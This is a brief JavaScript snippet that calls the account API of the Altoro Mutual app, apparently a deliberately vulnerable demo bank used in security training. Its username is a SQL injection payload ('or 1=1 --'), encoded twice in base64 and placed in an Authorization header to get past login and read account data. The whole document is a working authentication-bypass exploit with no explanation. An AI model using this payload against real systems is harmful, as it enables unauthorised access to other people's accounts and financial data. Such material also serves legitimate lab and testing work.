username = "asd' or 1=1 --";
password = 'asd';
auth = btoa(btoa(username) + ':' + btoa(password)) + ":asd";
await (
  await fetch('/altoromutual/api/account', {
    headers: { Authorization: auth }
  })
).json();
